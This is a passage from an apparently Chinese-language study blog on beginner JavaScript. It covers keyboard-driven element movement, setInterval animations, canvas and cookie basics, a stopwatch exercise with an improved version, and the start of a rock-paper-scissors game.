class="property">style</span>.<span class="property">top</span>=y+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;ArrowUp&quot;</span>:</span><br><span class="line">            y-=<span class="number">5</span>;</span><br><span class="line">            mydiv.<span class="property">style</span>.<span class="property">top</span>=y+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;ArrowLeft&quot;</span>:</span><br><span class="line">            x-=<span class="number">5</span>;</span><br><span class="line">            mydiv.<span class="property">style</span>.<span class="property">left</span>=x+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;ArrowRight&quot;</span>:</span><br><span class="line">            x+=<span class="number">5</span>;</span><br><span class="line">            mydiv.<span class="property">style</span>.<span class="property">left</span>=x+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动画效果"><a href="#动画效果" class="headerlink" title="动画效果"></a>动画效果</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类比于做ppt、剪辑时的一些转场动画</span></span><br><span class="line"><span class="keyword">const</span> bt=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mybut&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mydiv=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mydiv&quot;</span>);</span><br><span class="line"></span><br><span class="line">bt.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,begin);<span class="comment">//添加点击事件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">begin</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> timerId=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> x=<span class="number">0</span>,y=<span class="number">0</span>; <span class="comment">//移动</span></span><br><span class="line">    <span class="keyword">let</span> degress=<span class="number">0</span>; <span class="comment">//旋转</span></span><br><span class="line">    <span class="keyword">let</span> scareX=<span class="number">1</span>,scareY=<span class="number">1</span>;<span class="comment">//延伸</span></span><br><span class="line"></span><br><span class="line">    timerId=<span class="built_in">setInterval</span>(frame,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">frame</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//右下角移动</span></span><br><span class="line">        <span class="keyword">if</span>(x&gt;=<span class="number">200</span> || y&gt;=<span class="number">200</span>)&#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(timerId);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            x+=<span class="number">1</span>;</span><br><span class="line">            y+=<span class="number">1</span>;</span><br><span class="line">            mydiv.<span class="property">style</span>.<span class="property">top</span>=y+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">            mydiv.<span class="property">style</span>.<span class="property">left</span>=x+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//翻转</span></span><br><span class="line">        <span class="keyword">if</span>(degress&gt;=<span class="number">360</span>)&#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(timerId);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            degress+=<span class="number">1</span>;</span><br><span class="line">            mydiv.<span class="property">style</span>.<span class="property">transform</span>=<span class="string">&quot;rotateZ(&quot;</span>+degress+<span class="string">&quot;deg)&quot;</span>;</span><br><span class="line">            <span class="comment">//rotateX、rotateY</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//两功能合并</span></span><br><span class="line">        <span class="comment">//  if(x&gt;=200 || y&gt;=200)&#123;</span></span><br><span class="line">        <span class="comment">//     clearInterval(timerId);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// else&#123;</span></span><br><span class="line">        <span class="comment">//     x+=1;</span></span><br><span class="line">        <span class="comment">//     y+=1;</span></span><br><span class="line">        <span class="comment">//     degress+=10;</span></span><br><span class="line">        <span class="comment">//     mydiv.style.top=y+&quot;px&quot;;</span></span><br><span class="line">        <span class="comment">//     mydiv.style.left=x+&quot;px&quot;;</span></span><br><span class="line">        <span class="comment">//     mydiv.style.transform=&quot;rotateZ(&quot;+degress+&quot;deg)&quot;;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//延伸</span></span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span>(scareX&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(timerId);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            scareX+=<span class="number">0.01</span>;</span><br><span class="line">            mydiv.<span class="property">style</span>.<span class="property">transform</span>=<span class="string">&quot;scale(&quot;</span>+scareX+<span class="string">&quot;,&quot;</span>+scareY+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>画布</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/html5-canvas-intro.html%EF%BC%8C%E5%88%B0%E6%97%B6%E5%80%99%E5%86%8D%E5%AD%A6">https://www.runoob.com/w3cnote/html5-canvas-intro.html，到时候再学</a></p>
<ol>
<li><p><code>beginPath()</code></p>
<p>新建一条路径，路径一旦创建成功，图形绘制命令被指向到路径上生成路径</p>
</li>
<li><p><code>moveTo(x, y)</code></p>
<p>把画笔移动到指定的坐标<code>(x, y)</code>。相当于设置路径的起始点坐标。</p>
</li>
<li><p><code>closePath()</code></p>
<p>闭合路径之后，图形绘制命令又重新指向到上下文中</p>
</li>
<li><p><code>stroke()</code></p>
<p>通过线条来绘制图形轮廓</p>
</li>
<li><p><code>fill()</code></p>
<p>通过填充路径的内容区域生成实心的图形</p>
</li>
</ol>
<p><strong>window</strong></p>
<p>表示浏览器窗口</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/js/js-window.html">https://www.runoob.com/js/js-window.html</a></p>
<h3 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h3><p>存储在用户电脑上，用于记住一些用户信息</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;firstName=sdsd;expires=Sun;path=/&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;LastName=sdsd;expires=Sun;path=/&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deletecookie</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="title function_">setCookie</span>(name,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">deletecookie</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure>



<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="1-秒表计时"><a href="#1-秒表计时" class="headerlink" title="1.秒表计时"></a>1.秒表计时</h3><p>功能有开始，暂停和重置</p>
<p>自己的版本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mytime=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myclock&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> h=<span class="number">0</span>,m=<span class="number">0</span>,s=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> miaobiao=<span class="literal">null</span>;</span><br><span class="line"><span class="comment">//开始</span></span><br><span class="line"><span class="keyword">const</span> start=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">start.<span class="property">onclick</span>=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    miaobiao=<span class="built_in">setInterval</span>(jishi,<span class="number">1000</span>);</span><br><span class="line">    start.<span class="property">disabled</span>=<span class="literal">true</span>;</span><br><span class="line">    pause.<span class="property">disabled</span>=<span class="literal">false</span>; </span><br><span class="line">    reset.<span class="property">disabled</span>=<span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">const</span> pause=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">pause.<span class="property">onclick</span>=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(miaobiao);   </span><br><span class="line">    pause.<span class="property">disabled</span>=<span class="literal">true</span>; </span><br><span class="line">    start.<span class="property">disabled</span>=<span class="literal">false</span>;</span><br><span class="line">    reset.<span class="property">disabled</span>=<span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重置</span></span><br><span class="line"><span class="keyword">const</span> reset=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;reset&quot;</span>);</span><br><span class="line">reset.<span class="property">onclick</span>=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(miaobiao); <span class="comment">//解决1：</span></span><br><span class="line">    miaobiao=<span class="literal">null</span>;<span class="comment">//否则又会重新执行setInterval</span></span><br><span class="line">    h=<span class="number">0</span>;</span><br><span class="line">    m=<span class="number">0</span>;</span><br><span class="line">    s=<span class="number">0</span>;</span><br><span class="line">    reset.<span class="property">disabled</span>=<span class="literal">true</span>; </span><br><span class="line">    start.<span class="property">disabled</span>=<span class="literal">false</span>;</span><br><span class="line">    pause.<span class="property">disabled</span>=<span class="literal">false</span>; </span><br><span class="line">    mytime.<span class="property">innerHTML</span>=<span class="string">`0<span class="subst">$&#123;h&#125;</span>:0<span class="subst">$&#123;m&#125;</span>:0<span class="subst">$&#123;s&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jishi</span>(<span class="params"></span>)&#123;</span><br><span class="line">    </span><br><span class="line">    s+=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(s&gt;<span class="number">59</span>)&#123;</span><br><span class="line">        s=<span class="number">0</span>;</span><br><span class="line">        m+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(m&gt;<span class="number">59</span>)&#123;</span><br><span class="line">        m=<span class="number">0</span>;</span><br><span class="line">        h+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    h1=<span class="title function_">get0</span>(h);</span><br><span class="line">    m1=<span class="title function_">get0</span>(m);</span><br><span class="line">    s1=<span class="title function_">get0</span>(s);</span><br><span class="line">    mytime.<span class="property">innerHTML</span>=<span class="string">`<span class="subst">$&#123;h1&#125;</span>:<span class="subst">$&#123;m1&#125;</span>:<span class="subst">$&#123;s1&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不够填0</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get0</span>(<span class="params">m</span>)&#123;</span><br><span class="line">        m=m.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">return</span> m.<span class="property">length</span>&lt;<span class="number">2</span>?<span class="string">&quot;0&quot;</span>+<span class="attr">m</span>:m;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">问题1：如果点了开始，再点重置，暂停就没用了，重置之后也会继续计数</span></span><br><span class="line"><span class="comment">A:见解决1：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">问题2：多点几次开始，暂停和重置就无效了</span></span><br><span class="line"><span class="comment">A:看来要将button给失效化，即不能触发点击</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><strong>优化方案</strong></p>
<p>html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;rongqi&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;myclock&quot;</span>&gt;</span>00:00:00<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;start&quot;</span> <span class="attr">class</span>=<span class="string">&quot;but&quot;</span>&gt;</span>开始<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;pause&quot;</span> <span class="attr">class</span>=<span class="string">&quot;but&quot;</span>&gt;</span>暂停<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">class</span>=<span class="string">&quot;but&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>css</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.but</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">80px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">border</span>:<span class="number">3px</span> solid;</span><br><span class="line">    <span class="attribute">background-color</span>: aqua;</span><br><span class="line">    <span class="attribute">cursor</span>:pointer;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;Courier New&#x27;</span>, Courier, monospace;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#myclock</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:blue;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">75px</span>;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;Franklin Gothic Medium&#x27;</span>, <span class="string">&#x27;Arial Narrow&#x27;</span>, Arial, sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#rongqi</span>&#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">border</span>:<span class="number">3px</span> solid;</span><br><span class="line">    <span class="attribute">background-color</span>: black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mytime=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#myclock&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mystart=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#start&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mypause=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#pause&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> myreset=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#reset&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> h=<span class="number">0</span>,m=<span class="number">0</span>,s=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> starttime=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> elapsedtime=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> curtime=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">IntervalId</span>;</span><br><span class="line"><span class="keyword">let</span> paused=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">mystart.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(paused)&#123;</span><br><span class="line">        paused=<span class="literal">false</span>;</span><br><span class="line">        starttime=<span class="title class_">Date</span>.<span class="title function_">now</span>()-elapsedtime;</span><br><span class="line">        <span class="title class_">IntervalId</span>=<span class="built_in">setInterval</span>(updateTime,<span class="number">75</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">mypause.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!paused)&#123;</span><br><span class="line">        paused=<span class="literal">true</span>;</span><br><span class="line">        elapsedtime=<span class="title class_">Date</span>.<span class="title function_">now</span>()-starttime;</span><br><span class="line">        <span class="built_in">clearInterval</span>(<span class="title class_">IntervalId</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">myreset.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    paused=<span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="title class_">IntervalId</span>);</span><br><span class="line">    h=<span class="number">0</span>;</span><br><span class="line">    m=<span class="number">0</span>;</span><br><span class="line">    s=<span class="number">0</span>;</span><br><span class="line">    starttime=<span class="number">0</span>;</span><br><span class="line">    elapsedtime=<span class="number">0</span>;</span><br><span class="line">    curtime=<span class="number">0</span>;</span><br><span class="line">    mytime.<span class="property">textContent</span>=<span class="string">`00:00:00`</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateTime</span>(<span class="params"></span>)&#123;</span><br><span class="line">    elapsedtime=<span class="title class_">Date</span>.<span class="title function_">now</span>()-starttime;</span><br><span class="line">    s=<span class="title class_">Math</span>.<span class="title function_">floor</span>((elapsedtime/<span class="number">1000</span>)%<span class="number">60</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    elapsedtime/1000 将毫秒转换为秒</span></span><br><span class="line"><span class="comment">     % 60 运算符取余数，确保秒数在 0 到 59 的范围内</span></span><br><span class="line"><span class="comment">    Math.floor() 函数将结果向下取整，以确保返回整数值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    m=<span class="title class_">Math</span>.<span class="title function_">floor</span>((elapsedtime/(<span class="number">1000</span>*<span class="number">60</span>))%<span class="number">60</span>);</span><br><span class="line">    h=<span class="title class_">Math</span>.<span class="title function_">floor</span>((elapsedtime/(<span class="number">1000</span>*<span class="number">60</span>*<span class="number">60</span>))%<span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">    s=<span class="title function_">get0</span>(s);</span><br><span class="line">    m=<span class="title function_">get0</span>(m);</span><br><span class="line">    h=<span class="title function_">get0</span>(h);</span><br><span class="line">    mytime.<span class="property">textContent</span>=<span class="string">`<span class="subst">$&#123;h&#125;</span>:<span class="subst">$&#123;m&#125;</span>:<span class="subst">$&#123;s&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get0</span>(<span class="params">unit</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ((<span class="string">&quot;0&quot;</span>+unit).<span class="property">length</span>)&gt;<span class="number">2</span>?<span class="attr">unit</span>:<span class="string">&quot;0&quot;</span>+unit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231116120524500.png" alt="image-20231116120524500"></p>
<h3 id="2-石头剪刀布"><a href="#2-石头剪刀布" class="headerlink" title="2.石头剪刀布"></a>2.石头剪刀布</h3><p>自写代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//石头剪刀布</span></span><br><span class="line"><span class="keyword">const</span> me=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#me&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> pc=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#pc&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> shitou=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#shitou&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jiandao=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#jiandao&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bu=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#bu&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> result=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#result&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> res;<span class="comment">//石头为1，剪刀为2，布为3</span></span><br><span class="line"><span class="comment">//let x=Math.floor(Math.random()*3+1); //保证在1到3之间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//键值对，方便查找</span></span><br><span class="line"><span class="keyword">const</span> map=<span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>,<span class="string">&quot;石头&quot;</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">2</span>,<span class="string">&quot;剪刀&quot;</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">3</span>,<span class="string">&quot;布&quot;</span>);</span><br><span class="line"></span><br><span class="line">shitou.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    res=<span class="number">1</span>;</span><br><span class="line">    x=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">3</span>+<span class="number">1</span>);</span><br><span class="line">    pc.<span class="property">textContent</span>=map.<span class="title function_">get</span>(x);</span><br><span class="line">    me.<span class="property">textContent</span>=<span class="string">&quot;石头&quot;</span>;</span><br><span class="line">    <span class="title function_">bijiao</span>(x,res);</span><br><span class="line">&#125;);</span><br><span class="line">jiandao.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    res=<span class="number">2</span>;</span><br><span class="line">    x=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">3</span>+<span class="number">1</span>);</span><br><span class="line">    pc.<span class="property">textContent</span>=map.<span class="title function_">get</span>(x);</span><br><span class="line">    me.<span class="property">textContent</span>=<span class="string">&quot;剪刀&quot;</span>;</span><br><span class="line">    <span class="title function_">bijiao</span>(x,res);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">bu.<span class="title 